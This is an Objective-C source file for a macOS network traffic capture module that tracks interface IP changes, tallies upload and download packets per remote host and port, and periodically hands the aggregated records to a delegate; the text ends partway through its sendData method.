//
//  NetworkTrafficCapture.m
//  NetworkTrafficCaptureManager
//
//  Created by ophat on 10/9/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//


#include <stdio.h>
#include <ifaddrs.h>
#include <arpa/inet.h>

#import <SystemConfiguration/SystemConfiguration.h>
#import <CoreWLAN/CoreWLAN.h>

#import "NTPacket.h"
#import "NetworkTrafficCapture.h"

#import "FxNetworkTrafficEvent.h"

#import "SystemUtilsImpl.h"
#import "DateTimeFormat.h"


#define kDirectionTypeDownload      0
#define kDirectionTypeUpload        1

@implementation NetworkTrafficCapture
@synthesize mDelegate, mSelector , mThread;
@synthesize mMyUrl;

@synthesize mTotalDownloadByLan , mTotalUploadByLan;
@synthesize mTotalDownloadByWifi , mTotalUploadByWifi;
@synthesize mStartTime , mEndTime;
@synthesize mEn0IP , mEn1IP;

@synthesize mSchedule, mCounter;
@synthesize mIsTracking;
@synthesize mCFRunLoop1, mCFRunLoopSrc1;
@synthesize mCFRunLoop2, mCFRunLoopSrc2;
@synthesize mHostnames, mIPToRevert;
@synthesize mDataPath;
@synthesize mWatchlist;
@synthesize mStream,mCurrentRunloopRef;
@synthesize mCollectorQueue;

NetworkTrafficCapture * _NetworkTrafficCapture;

#pragma mark ### start/stop
-(id)init{
    self = [super init];
    if (self) {
        _NetworkTrafficCapture = self;
        mCollectorQueue = [[NSOperationQueue alloc] init];
        mCollectorQueue.maxConcurrentOperationCount = 1;
    }
    return self;
}
-(void) prepareStartUp {
    
    if (mTotalDownloadByLan) {
        [mTotalDownloadByLan release];
    }
    mTotalDownloadByLan  = [[NSMutableArray alloc]init];
    
    if (mTotalUploadByLan) {
        [mTotalUploadByLan release];
    }
    mTotalUploadByLan    = [[NSMutableArray alloc]init];
    
    if (mTotalDownloadByWifi) {
        [mTotalDownloadByWifi release];
    }
    mTotalDownloadByWifi = [[NSMutableArray alloc]init];
    
    if (mTotalUploadByWifi) {
        [mTotalUploadByWifi release];
    }
    mTotalUploadByWifi   = [[NSMutableArray alloc]init];
    
    if (mHostnames) {
        [mHostnames release];
    }
    mHostnames           = [[NSMutableArray alloc]init];
    
    if (mIPToRevert) {
        [mIPToRevert release];
    }
    mIPToRevert          = [[NSMutableArray alloc]init];
    
    if (mWatchlist) {
        [mWatchlist removeAllObjects];
        [mWatchlist release];
    }
    mWatchlist           = [[NSMutableArray alloc]init];
    [mWatchlist addObject:mDataPath];
    
    [self getCurrentIPAddress];
}

#pragma mark ### start/stop

-(void) startCapture{
    self.mIsTracking = true;
    
    [self prepareStartUp];
    [self startLanNetworkNotifierChange];
    [self startWifiNetworkNotifierChange];
}

-(void) stopCapture {
    self.mIsTracking = false;
    
    [self.mSchedule invalidate];
    self.mSchedule = nil;
    
    [self sendToDaemonWithToStop];
    [self stopLanNetworkNotifierChange];
    [self stopWifiNetworkNotifierChange];
    
    //Stop Watcher
    if (mStream != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
}

- (BOOL) startCaptureWithDuration:(int)aMin frequency:(int)aFre{
    if (!mIsTracking ) {
        if ( aMin != 0 ) {
            
            if ( aMin == -1 ) {
                mCounter = -1;
            }else{
                mCounter = aMin / aFre;
            }
            
            [self startCapture];
            [self watchThisPath:mWatchlist];
            
            sleep(5);
            
            [self sendToDaemonWithToStartCaptureWithDuration:aMin frequency:aFre];
            
            self.mStartTime = [DateTimeFormat phoenixDateTime];
            
            self.mSchedule = [NSTimer scheduledTimerWithTimeInterval:(aFre) target:self selector:@selector(triggerForSend) userInfo:nil repeats:YES];
            
            DLog(@"### startCaptureWithDuration For %d Mins Every %d Sec",aMin,aFre);
            
            return true;
            
        }else{
            DLog(@"### Can't Start with 0 Duration");
        }
    }else{
        DLog(@"### IsTracking");
    }
    return false;
}

#pragma mark ### start /stop NetworkChangeAdapter

- (void) startLanNetworkNotifierChange {
    DLog(@"startLanNetworkNotifierChange ==> start");
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        NSMutableArray *scKeys = [[NSMutableArray alloc] init];
        [scKeys addObject:@"State:/Network/Interface/en0/IPv4"];
        
        SCDynamicStoreContext ctx = { 0, NULL, NULL, NULL, NULL };
        SCDynamicStoreRef store = SCDynamicStoreCreate(kCFAllocatorDefault,nil, lans_Network_ChangedCallback, &ctx);
        if (store == NULL) {
            [scKeys release];
            return;
        }
        
        SCDynamicStoreSetNotificationKeys(store, (__bridge CFArrayRef)scKeys,  NULL);
        [scKeys release];
        
        mCFRunLoop2 = CFRunLoopGetCurrent();
        mCFRunLoopSrc2 = SCDynamicStoreCreateRunLoopSource(NULL, store, 0);
        CFRunLoopAddSource(mCFRunLoop2, mCFRunLoopSrc2, kCFRunLoopDefaultMode);
        [[NSRunLoop currentRunLoop] run];
        
        CFRelease(store);
    });
}

- (void) stopLanNetworkNotifierChange{
    DLog(@"stopLanNetworkNotifierChange ==> stop");
    if (mCFRunLoop2 != nil && mCFRunLoopSrc2 != nil) {
        CFRunLoopRemoveSource(mCFRunLoop2, mCFRunLoopSrc2, kCFRunLoopDefaultMode);
        CFRunLoopStop(mCFRunLoop2);
        mCFRunLoopSrc2 = nil;
        mCFRunLoop2 = nil;
    }
}

- (void) startWifiNetworkNotifierChange {
    DLog(@"startWifiNetworkNotifierChange ==> start");
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        NSMutableArray *scKeys = [[NSMutableArray alloc] init];
        [scKeys addObject:@"State:/Network/Interface/en1/IPv4"];
        
        SCDynamicStoreContext ctx = { 0, NULL, NULL, NULL, NULL };
        SCDynamicStoreRef store = SCDynamicStoreCreate(kCFAllocatorDefault,nil, wifi_Network_ChangedCallback, &ctx);
        if (store == NULL) {
            [scKeys release];
            return;
        }
        
        SCDynamicStoreSetNotificationKeys(store, (__bridge CFArrayRef)scKeys,  NULL);
        [scKeys release];
        
        mCFRunLoop1 = CFRunLoopGetCurrent();
        mCFRunLoopSrc1 = SCDynamicStoreCreateRunLoopSource(NULL, store, 0);
        CFRunLoopAddSource( mCFRunLoop1 , mCFRunLoopSrc1, kCFRunLoopDefaultMode);
        [[NSRunLoop currentRunLoop] run];
        
        CFRelease(store);
    });
}

- (void) stopWifiNetworkNotifierChange {
    DLog(@"stopWifiNetworkNotifierChange ==> stop");
    if (mCFRunLoop1 != nil && mCFRunLoopSrc1 != nil) {
        CFRunLoopRemoveSource(mCFRunLoop1, mCFRunLoopSrc1, kCFRunLoopDefaultMode);
        CFRunLoopStop(mCFRunLoop1);
        mCFRunLoopSrc1 = nil;
        mCFRunLoop1 = nil;
    }
}

#pragma mark ### Lan / Wifi CallbackNotifier

void wifi_Network_ChangedCallback(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx){
    [(__bridge NSArray *)changedKeys enumerateObjectsUsingBlock:^(NSString *key, NSUInteger idx, BOOL *stop) {
        NSString *adapterName = [key componentsSeparatedByString:@"/"][3];
        CWInterface *interface = [CWInterface interfaceWithName:adapterName];
        if ([[interface ssid] length]>0) {
            [_NetworkTrafficCapture updateIPBy:@"Wifi"];
        }
    }];
}

void lans_Network_ChangedCallback(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx){
    [(__bridge NSArray *)changedKeys enumerateObjectsUsingBlock:^(NSString *key, NSUInteger idx, BOOL *stop) {
        NSString *adapterName = [key componentsSeparatedByString:@"/"][3];
        if ([adapterName length]>0) {
            [_NetworkTrafficCapture updateIPBy:@"Lan"];
        }
    }];
}

-(void) updateIPBy:(NSString *)aType{
    DLog(@"Update all IP By %@",aType);
    [self getCurrentIPAddress];
}

#pragma mark ### CapturePacket

-(void) receivePacketByLan :(NSMutableDictionary *) aInFo {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    int trafficType = [[aInFo objectForKey:@"trafficType"] intValue];
    NSString * packet_length = [aInFo objectForKey:@"packet_length"];
    NSString * sourceIP = [aInFo objectForKey:@"sourceIP"];
    NSString * sourcePort = [aInFo objectForKey:@"sourcePort"];
    NSString * destinationIP = [aInFo objectForKey:@"destinationIP"];
    NSString * destinationPort = [aInFo objectForKey:@"destinationPort"];
    NSString * usedInterfaceHandle = [aInFo objectForKey:@"mUsedInterfaceHandle"];
    NSString * payload = [aInFo objectForKey:@"payload"];
    
    if ([mEn0IP isEqualToString:sourceIP] || [mEn1IP isEqualToString:sourceIP] ) {
        
        NTPacket * temp = [[NTPacket alloc] init];
        [temp setMTransportProtocol:trafficType];
        [temp setMDirection:kDirectionTypeUpload];
        [temp setMInterface:kNetworkTypeWired];
        [temp setMInterfaceName:usedInterfaceHandle];
        [temp setMPort:[destinationPort intValue]];
        [temp setMSource:sourceIP];
        [temp setMDestination:destinationIP];
        [temp setMSize:[packet_length integerValue]];
        
        if ([mTotalUploadByLan count] == 0) {
            
            NSString * resolver = [[NSString alloc]initWithString:[self getSource:payload]];
            if ([resolver length]>0) {
                [temp setMHostname:resolver];
            }else{
                
                if ([[self mIPToRevert]containsObject:destinationIP]) {
                    for (int i=0; i < [[self mIPToRevert] count]; i++) {
                        if ([[[self mIPToRevert] objectAtIndex:i] isEqualTo:destinationIP]) {
                            [temp setMHostname:[[self mHostnames] objectAtIndex:i]];
                            break;
                        }
                    }
                }else{
                    NSString * host = [[NSString alloc]initWithString:[self getOnlyHostname:[self runAsCommand:[NSString stringWithFormat:@"host -W -999999 %@",destinationIP]]]];
                    [temp setMHostname:host];
                    [[self mIPToRevert]addObject:destinationIP];
                    [[self mHostnames] addObject:host];
                    [host release];
                }
                
            }
            [temp setMPacketCount:1];
            [[self mTotalUploadByLan] addObject:temp];
            [resolver release];
        }else{
            int indexSeq = -1;
            for (int i = 0; i < [mTotalUploadByLan count]; i++) {
                NTPacket * sub = [mTotalUploadByLan objectAtIndex:i];
                if ([NTPacket comparePacket:sub with:temp]) {
                    indexSeq = i;
                }
            }
            if (indexSeq == -1) {
                NSString * resolver = [[NSString alloc]initWithString:[self getSource:payload]];
                if ([resolver length]>0) {
                    [temp setMHostname:resolver];
                }else{
                    if ([[self mIPToRevert]containsObject:destinationIP]) {
                        for (int i=0; i < [[self mIPToRevert] count]; i++) {
                            if ([[[self mIPToRevert] objectAtIndex:i] isEqualTo:destinationIP]) {
                                [temp setMHostname:[[self mHostnames] objectAtIndex:i]];
                                break;
                            }
                        }
                    }else{
                        NSString * host = [[NSString alloc]initWithString:[self getOnlyHostname:[self runAsCommand:[NSString stringWithFormat:@"host -W -999999 %@",destinationIP]]]];
                        [temp setMHostname:host];
                        [[self mIPToRevert]addObject:destinationIP];
                        [[self mHostnames] addObject:host];
                        [host release];
                    }
                    
                }
                [temp setMPacketCount:1];
                [[self mTotalUploadByLan] addObject:temp];
                [resolver release];
            }else{
                int sumSize = (int)[[mTotalUploadByLan objectAtIndex:indexSeq] mSize] + (int)[temp mSize];
                [[self.mTotalUploadByLan objectAtIndex:indexSeq] setMSize:sumSize];
                int sumPacket = (int)[[mTotalUploadByLan objectAtIndex:indexSeq] mPacketCount] + 1;
                [[self.mTotalUploadByLan objectAtIndex:indexSeq] setMPacketCount:sumPacket];
            }
        }
        
        [temp release];
        
        
    }else if ([mEn0IP isEqualToString:destinationIP] || [mEn1IP isEqualToString:destinationIP] ) {
        
        NTPacket * temp = [[NTPacket alloc] init];
        [temp setMTransportProtocol:trafficType];
        [temp setMDirection:kDirectionTypeDownload];
        [temp setMInterface:kNetworkTypeWired];
        [temp setMInterfaceName:usedInterfaceHandle];
        [temp setMPort:[sourcePort intValue]];
        [temp setMSource:sourceIP];
        [temp setMDestination:destinationIP];
        [temp setMSize:[packet_length integerValue]];
        
        if ([mTotalDownloadByLan count] == 0) {
            NSString * resolver = [[NSString alloc]initWithString:[self getSource:payload]];
            if ([resolver length]>0) {
                [temp setMHostname:resolver];
            }else{
                if ([[self mIPToRevert]containsObject:sourceIP]) {
                    for (int i=0; i < [[self mIPToRevert] count]; i++) {
                        if ([[[self mIPToRevert] objectAtIndex:i] isEqualTo:sourceIP]) {
                            [temp setMHostname:[[self mHostnames] objectAtIndex:i]];
                            break;
                        }
                    }
                }else{
                    NSString * host = [[NSString alloc]initWithString:[self getOnlyHostname:[self runAsCommand:[NSString stringWithFormat:@"host -W -999999 %@",sourceIP]]]];
                    [temp setMHostname:host];
                    [[self mIPToRevert]addObject:sourceIP];
                    [[self mHostnames] addObject:host];
                    [host release];
                }
            }
            [temp setMPacketCount:1];
            [[self mTotalDownloadByLan] addObject:temp];
            [resolver release];
        }else{
            int indexSeq = -1;
            for (int i = 0; i < [mTotalDownloadByLan count]; i++) {
                NTPacket * sub = [mTotalDownloadByLan objectAtIndex:i];
                if ([NTPacket comparePacket:sub with:temp]) {
                    indexSeq = i;
                }
            }
            if (indexSeq == -1) {
                NSString * resolver = [[NSString alloc]initWithString:[self getSource:payload]];
                if ([resolver length]>0) {
                    [temp setMHostname:resolver];
                }else{
                    if ([[self mIPToRevert]containsObject:sourceIP]) {
                        for (int i=0; i < [[self mIPToRevert] count]; i++) {
                            if ([[[self mIPToRevert] objectAtIndex:i] isEqualTo:sourceIP]) {
                                [temp setMHostname:[[self mHostnames] objectAtIndex:i]];
                                break;
                            }
                        }
                    }else{
                        NSString * host = [[NSString alloc]initWithString:[self getOnlyHostname:[self runAsCommand:[NSString stringWithFormat:@"host -W -999999 %@",sourceIP]]]];
                        [temp setMHostname:host];
                        [[self mIPToRevert]addObject:sourceIP];
                        [[self mHostnames] addObject:host];
                        [host release];
                    }
                    
                }
                [temp setMPacketCount:1];
                [[self mTotalDownloadByLan] addObject:temp];
                [resolver release];
            }else{
                int sumSize = (int)[[mTotalDownloadByLan objectAtIndex:indexSeq] mSize] + (int)[temp mSize];
                [[self.mTotalDownloadByLan objectAtIndex:indexSeq] setMSize:sumSize];
                int sumPacket = (int)[[mTotalDownloadByLan objectAtIndex:indexSeq] mPacketCount] + 1;
                [[self.mTotalDownloadByLan objectAtIndex:indexSeq] setMPacketCount:sumPacket];
            }
        }
        
        [temp release];
        
    }
    
    
    [pool drain];
}

-(void) receivePacketByWifi :(NSMutableDictionary *) aInFo {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    int trafficType = [[aInFo objectForKey:@"trafficType"] intValue];
    NSString * packet_length = [aInFo objectForKey:@"packet_length"];
    NSString * sourceIP = [aInFo objectForKey:@"sourceIP"];
    NSString * sourcePort = [aInFo objectForKey:@"sourcePort"];
    NSString * destinationIP = [aInFo objectForKey:@"destinationIP"];
    NSString * destinationPort = [aInFo objectForKey:@"destinationPort"];
    NSString * usedInterfaceHandle = [aInFo objectForKey:@"mUsedInterfaceHandle"];
    NSString * payload = [aInFo objectForKey:@"payload"];
    
    if ([mEn0IP isEqualToString:sourceIP] || [mEn1IP isEqualToString:sourceIP] ) {
        
        NTPacket * temp = [[NTPacket alloc] init];
        [temp setMTransportProtocol:trafficType];
        [temp setMDirection:kDirectionTypeUpload];
        [temp setMInterface:kNetworkTypeWifi];
        [temp setMInterfaceName:usedInterfaceHandle];
        [temp setMPort:[destinationPort intValue]];
        [temp setMSource:sourceIP];
        [temp setMDestination:destinationIP];
        [temp setMSize:[packet_length intValue]];
        
        if ([mTotalUploadByWifi count] == 0) {
            NSString * resolver = [[NSString alloc]initWithString:[self getSource:payload]];
            if ([resolver length]>0) {
                [temp setMHostname:resolver];
            }else{
                if ([[self mIPToRevert]containsObject:destinationIP]) {
                    for (int i=0; i < [[self mIPToRevert] count]; i++) {
                        if ([[[self mIPToRevert] objectAtIndex:i] isEqualTo:destinationIP]) {
                            [temp setMHostname:[[self mHostnames] objectAtIndex:i]];
                            break;
                        }
                    }
                }else{
                    NSString * host = [[NSString alloc]initWithString:[self getOnlyHostname:[self runAsCommand:[NSString stringWithFormat:@"host -W -999999 %@",destinationIP]]]];
                    [temp setMHostname:host];
                    [[self mIPToRevert]addObject:destinationIP];
                    [[self mHostnames] addObject:host];
                    [host release];
                }
                
            }
            [temp setMPacketCount:1];
            [[self mTotalUploadByWifi] addObject:temp];
            [resolver release];
        }else{
            int indexSeq = -1;
            for (int i = 0; i < [mTotalUploadByWifi count]; i++) {
                NTPacket * sub = [mTotalUploadByWifi objectAtIndex:i];
                if ([NTPacket comparePacket:sub with:temp]) {
                    indexSeq = i;
                }
            }
            if (indexSeq == -1) {
                NSString * resolver = [[NSString alloc]initWithString:[self getSource:payload]];
                if ([resolver length]>0) {
                    [temp setMHostname:resolver];
                }else{
                    if ([[self mIPToRevert]containsObject:destinationIP]) {
                        for (int i=0; i < [[self mIPToRevert] count]; i++) {
                            if ([[[self mIPToRevert] objectAtIndex:i] isEqualTo:destinationIP]) {
                                [temp setMHostname:[[self mHostnames] objectAtIndex:i]];
                                break;
                            }
                        }
                    }else{
                        NSString * host = [[NSString alloc]initWithString:[self getOnlyHostname:[self runAsCommand:[NSString stringWithFormat:@"host -W -999999 %@",destinationIP]]]];
                        [temp setMHostname:host];
                        [[self mIPToRevert]addObject:destinationIP];
                        [[self mHostnames] addObject:host];
                        [host release];
                    }
                    
                }
                [temp setMPacketCount:1];
                [[self mTotalUploadByWifi] addObject:temp];
                [resolver release];
            }else{
                int sumSize = (int)[[mTotalUploadByWifi objectAtIndex:indexSeq] mSize] + (int)[temp mSize];
                [[self.mTotalUploadByWifi objectAtIndex:indexSeq] setMSize:sumSize];
                int sumPacket = (int)[[mTotalUploadByWifi objectAtIndex:indexSeq] mPacketCount] + 1;
                [[self.mTotalUploadByWifi objectAtIndex:indexSeq] setMPacketCount:sumPacket];
            }
        }
        
        [temp release];
        
    }else if ([mEn0IP isEqualToString:destinationIP] || [mEn1IP isEqualToString:destinationIP] ) {
        
        NTPacket * temp = [[NTPacket alloc] init];
        [temp setMTransportProtocol:trafficType];
        [temp setMDirection:kDirectionTypeDownload];
        [temp setMInterface:kNetworkTypeWifi];
        [temp setMInterfaceName:usedInterfaceHandle];
        [temp setMPort:[sourcePort intValue]];
        [temp setMSource:sourceIP];
        [temp setMDestination:destinationIP];
        [temp setMSize:[packet_length integerValue]];
        
        if ([mTotalDownloadByWifi count] == 0) {
            NSString * resolver = [[NSString alloc]initWithString:[self getSource:payload]];
            if ([resolver length]>0) {
                [temp setMHostname:resolver];
            }else{
                if ([[self mIPToRevert]containsObject:sourceIP]) {
                    for (int i=0; i < [[self mIPToRevert] count]; i++) {
                        if ([[[self mIPToRevert] objectAtIndex:i] isEqualTo:sourceIP]) {
                            [temp setMHostname:[[self mHostnames] objectAtIndex:i]];
                            break;
                        }
                    }
                }else{
                    NSString * host = [[NSString alloc]initWithString:[self getOnlyHostname:[self runAsCommand:[NSString stringWithFormat:@"host -W -999999 %@",sourceIP]]]];
                    [temp setMHostname:host];
                    [[self mIPToRevert]addObject:sourceIP];
                    [[self mHostnames] addObject:host];
                    [host release];
                }
                
            }
            [temp setMPacketCount:1];
            [[self mTotalDownloadByWifi] addObject:temp];
            [resolver release];
        }else{
            int indexSeq = -1;
            for (int i = 0; i < [mTotalDownloadByWifi count]; i++) {
                NTPacket * sub = [mTotalDownloadByWifi objectAtIndex:i];
                if ([NTPacket comparePacket:sub with:temp]) {
                    indexSeq = i;
                }
            }
            if (indexSeq == -1) {
                NSString * resolver = [[NSString alloc]initWithString:[self getSource:payload]];
                if ([resolver length]>0) {
                    [temp setMHostname:resolver];
                }else{
                    if ([[self mIPToRevert]containsObject:sourceIP]) {
                        for (int i=0; i < [[self mIPToRevert] count]; i++) {
                            if ([[[self mIPToRevert] objectAtIndex:i] isEqualTo:sourceIP]) {
                                [temp setMHostname:[[self mHostnames] objectAtIndex:i]];
                                break;
                            }
                        }
                    }else{
                        NSString * host = [[NSString alloc]initWithString:[self getOnlyHostname:[self runAsCommand:[NSString stringWithFormat:@"host -W -999999 %@",sourceIP]]]];
                        [temp setMHostname:host];
                        [[self mIPToRevert]addObject:sourceIP];
                        [[self mHostnames] addObject:host];
                        [host release];
                    }
                    
                }
                [temp setMPacketCount:1];
                [[self mTotalDownloadByWifi] addObject:temp];
                [resolver release];
            }else{
                int sumSize = (int)[[mTotalDownloadByWifi objectAtIndex:indexSeq] mSize] + (int)[temp mSize];
                [[self.mTotalDownloadByWifi objectAtIndex:indexSeq] setMSize:sumSize];
                int sumPacket = (int)[[mTotalDownloadByWifi objectAtIndex:indexSeq] mPacketCount] + 1;
                [[self.mTotalDownloadByWifi objectAtIndex:indexSeq] setMPacketCount:sumPacket];
            }
        }
        
        [temp release];
        
    }
    
    [pool drain];
}

#pragma mark ### readyToSend

-(void)triggerForSend {
    DLog(@"########### triggerForSend");
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        [self readyToSend];
    });
}

- (void) readyToSend {
    @synchronized ([self mTotalDownloadByLan],[self mTotalUploadByLan],[self mTotalDownloadByWifi],[self mTotalUploadByWifi]) {
        if (mIsTracking) {
            
            if ( mCounter != -1 ) {
                mCounter--;
            }
            
            DLog(@"########### mCounter %d",self.mCounter);

            [self sendData];

            if (mCounter == 0 ) {
                [self stopCapture];
            }else{
                self.mStartTime = [DateTimeFormat phoenixDateTime];
            }
        }else{
            [self stopCapture];
        }
        [mTotalDownloadByLan removeAllObjects];
        [mTotalUploadByLan removeAllObjects];
        [mTotalDownloadByWifi removeAllObjects];
        [mTotalUploadByWifi removeAllObjects];
        self.mEndTime   = @"";
    }
}

-(NSMutableArray *) mergeDownload:(NSMutableArray *)aDownload AndUpload:(NSMutableArray *)aUpload{
    
    NSMutableArray * fxNetworkInterface = [[NSMutableArray alloc]init];
    
    NSMutableArray * masterData = [[NSMutableArray alloc]init];
    [masterData addObjectsFromArray:aDownload];
    [masterData addObjectsFromArray:aUpload];
    
    NSMutableArray * countOwnIP = [[NSMutableArray alloc]init];
    NSMutableArray * interfaceType = [[NSMutableArray alloc]init];
    NSMutableArray * interfaceName = [[NSMutableArray alloc]init];
    
    for (int i=0; i < [masterData count]; i++) {
        NTPacket * temp = [masterData objectAtIndex:i];
        if ( [temp mDirection] == kDirectionTypeDownload ) {
            if (![countOwnIP containsObject:[temp mDestination]]) {
                [countOwnIP addObject:[temp mDestination]];
                [interfaceType addObject:[NSNumber numberWithInt:(int)[temp mInterface]]];
                [interfaceName addObject:[temp mInterfaceName]];
            }
        }else if ( [temp mDirection] == kDirectionTypeUpload ) {
            if (![countOwnIP containsObject:[temp mSource]]) {
                [countOwnIP addObject:[temp mSource]];
                [interfaceType addObject:[NSNumber numberWithInt:(int)[temp mInterface]]];
                [interfaceName addObject:[temp mInterfaceName]];
            }
        }
    }
    
    for (int i=0; i < [countOwnIP count]; i++) {
        
        FxNetworkInterface * networkInterface = [[FxNetworkInterface  alloc]init];
        [networkInterface setMNetworkType:(FxNetworkType)[[interfaceType objectAtIndex:i]intValue]];
        [networkInterface setMInterfaceName:[interfaceName objectAtIndex:i]];
        [networkInterface setMDescription:@""];
        [networkInterface setMIPv4:[countOwnIP objectAtIndex:i]];
        [networkInterface setMIPv6:@""];
        
        NSMutableArray * countIP = [[NSMutableArray alloc]init];
        NSMutableArray * countMyIP = [[NSMutableArray alloc]init];
        NSMutableArray * hostName = [[NSMutableArray alloc]init];
        
        for (int j=0; j < [masterData count]; j++) {
            NTPacket * temp = [masterData objectAtIndex:j];
            if ( [temp mDirection] == kDirectionTypeDownload ) {
                if (![countIP containsObject:[temp mSource]]) {
                    [countMyIP addObject:[temp mDestination]];
                    [countIP addObject:[temp mSource]];
                    [hostName addObject:[temp mHostname]];
                }
            }else if ( [temp mDirection] == kDirectionTypeUpload ) {
                if (![countIP containsObject:[temp mDestination]]) {
                    [countMyIP addObject:[temp mSource]];
                    [countIP addObject:[temp mDestination]];
                    [hostName addObject:[temp mHostname]];
                }
            }
        }
        
        NSMutableArray * fxRemoteHost = [[NSMutableArray alloc]init];
        
        for (int j=0; j < [countIP count]; j++) {
            if ([[countMyIP objectAtIndex:j]isEqualToString:[countOwnIP objectAtIndex:i]]) {
                
                FxRemoteHost * remoteHost = [[FxRemoteHost alloc]init];
                [remoteHost setMHostName:[hostName objectAtIndex:j]];
                [remoteHost setMIPv4:[countIP objectAtIndex:j]];
                [remoteHost setMIPv6:@""];
                
                NSMutableArray * fxTraffic = [[NSMutableArray alloc]init];
                
                NSMutableArray * transportType = [[NSMutableArray alloc]init];
                NSMutableArray * port = [[NSMutableArray alloc]init];
                NSMutableArray * dataIn = [[NSMutableArray alloc]init];
                NSMutableArray * dataOut = [[NSMutableArray alloc]init];
                NSMutableArray * packetIn = [[NSMutableArray alloc]init];
                NSMutableArray * packetOut = [[NSMutableArray alloc]init];
                
                for (int k=0; k < [masterData count]; k++) {
                    NTPacket * temp = [masterData objectAtIndex:k];
                    if ( [temp mDirection] == kDirectionTypeDownload ) {
                        if ([[temp mSource] isEqualToString:[countIP objectAtIndex:j]]) {
                            if ([port containsObject:[NSNumber numberWithInt:(int)[temp mPort]]]) {
                                int index =-1;
                                for (int l = 0; l < [port count]; l++) {
                                    if ((int)[[port objectAtIndex:l] integerValue] == (int)[temp mPort]) {
                                        index = l;
                                    }
                                }
                                if (index != -1) {
                                    [dataIn replaceObjectAtIndex:index withObject:[NSNumber numberWithInt:(int)[temp mSize]]];
                                    [packetIn replaceObjectAtIndex:index withObject:[NSNumber numberWithInt:(int)[temp mPacketCount]]];
                                }
                            }else{
                                [transportType addObject:[NSNumber numberWithInt:(int)[temp mTransportProtocol]]];
                                [port addObject:[NSNumber numberWithInt:(int)[temp mPort]]];
                                [dataIn addObject:[NSNumber numberWithInt:(int)[temp mSize]]];
                                [dataOut addObject:[NSNumber numberWithInt:0]];
                                [packetIn addObject:[NSNumber numberWithInt:(int)[temp mPacketCount]]];
                                [packetOut addObject:[NSNumber numberWithInt:0]];
                            }
                        }
                    }else if ( [temp mDirection] == kDirectionTypeUpload ) {
                        if ([[temp mDestination] isEqualToString:[countIP objectAtIndex:j]]) {
                            if ([port containsObject:[NSNumber numberWithInt:(int)[temp mPort]]]) {
                                int index =-1;
                                for (int l = 0; l < [port count]; l++) {
                                    if ((int)[[port objectAtIndex:l] integerValue] == (int)[temp mPort]) {
                                        index = l;
                                    }
                                }
                                if (index != -1) {
                                    [dataOut replaceObjectAtIndex:index withObject:[NSNumber numberWithInt:(int)[temp mSize]]];
                                    [packetOut replaceObjectAtIndex:index withObject:[NSNumber numberWithInt:(int)[temp mPacketCount]]];
                                }
                            }else{
                                [transportType addObject:[NSNumber numberWithInt:(int)[temp mTransportProtocol]]];
                                [port addObject:[NSNumber numberWithInt:(int)[temp mPort]]];
                                [dataIn addObject:[NSNumber numberWithInt:0]];
                                [dataOut addObject:[NSNumber numberWithInt:(int)[temp mSize]]];
                                [packetIn addObject:[NSNumber numberWithInt:0]];
                                [packetOut addObject:[NSNumber numberWithInt:(int)[temp mPacketCount]]];
                            }
                        }
                    }
                }
                
                for (int k=0; k < [port count]; k++) {
                    FxTraffic * traffic = [[FxTraffic alloc]init];
                    [traffic setMTransportType:[[transportType objectAtIndex:k] integerValue]];
                    [traffic setMFxProtocolType:[self getProtocolTypeByPortNum:[[port objectAtIndex:k] intValue]]];
                    [traffic setMPortNumber:[[port objectAtIndex:k] integerValue]];
                    [traffic setMPacketsIn:[[packetIn objectAtIndex:k] integerValue]];
                    [traffic setMIncomingTrafficSize:[[dataIn objectAtIndex:k] integerValue]];
                    [traffic setMPacketsOut:[[packetOut objectAtIndex:k] integerValue]];
                    [traffic setMOutgoingTrafficSize:[[dataOut objectAtIndex:k] integerValue]];
                    [fxTraffic addObject:traffic];
                    [traffic release];
                }
                
                [remoteHost setMTraffics:fxTraffic];
                [fxRemoteHost addObject:remoteHost];
                
                [fxTraffic release];
                [remoteHost release];
                [packetOut release];
                [packetIn release];
                [dataOut release];
                [dataIn release];
                [port release];
                [transportType release];
            }
        }
        [networkInterface setMRemoteHosts:fxRemoteHost];
        [fxNetworkInterface addObject:networkInterface];
        
        [fxRemoteHost release];
        [countMyIP release];
        [countIP release];
        [hostName release];
        
        [networkInterface release];
    }
    
    [interfaceName release];
    [interfaceType release];
    [countOwnIP release];
    [masterData release];
    
    return  [fxNetworkInterface autorelease];
}

-(void) sendData {
    
    DLog(@"mStartTime %@",mStartTime);
    DLog(@"mEndTime %@",[DateTimeFormat phoenixDateTime]);
    DLog(@"###### mTotalDownloadByLan %d Count",(int)[mTotalDownloadByLan count]);
    //[NTPacket printDetail:mTotalDownloadByLan];
    DLog(@"###### mTotalUploadByLan %d Count",(int)[mTotalUploadByLan count]);
    //[NTPacket printDetail:mTotalUploadByLan];
    DLog(@"###### mTotalDownloadByWifi %d Count",(int)[mTotalDownloadByWifi count]);
    //[NTPacket printDetail:mTotalDownloadByWifi];
    DLog(@"###### mTotalUploadByWifi %d Count",(int)[mTotalUploadByWifi count]);
    //[NTPacket printDetail:mTotalUploadByWifi];
    
    if ([mDelegate respondsToSelector:mSelector]) {
        NSMutableArray *allNetworkInterfaces = [[NSMutableArray alloc]init];
        
        NSMutableArray * mergeByLan = [[NSMutableArray alloc]initWithArray:[self mergeDownload:self.mTotalDownloadByLan AndUpload:self.mTotalUploadByLan]];
        if ([mergeByLan count]>0) {
            [allNetworkInterfaces addObjectsFromArray:mergeByLan];
        }
        [mergeByLan release];
        
        NSMutableArray * mergeByWifi = [[NSMutableArray alloc]initWithArray:[self mergeDownload:self.mTotalDownloadByWifi AndUpload:self.mTotalUploadByWifi]];
        if ([mergeByWifi count]>0) {
            [allNetworkInterfaces addObjectsFromArray:mergeByWifi];
        }
        [mergeByWifi release];
        
        if ([allNetworkInterfaces count]>0) {
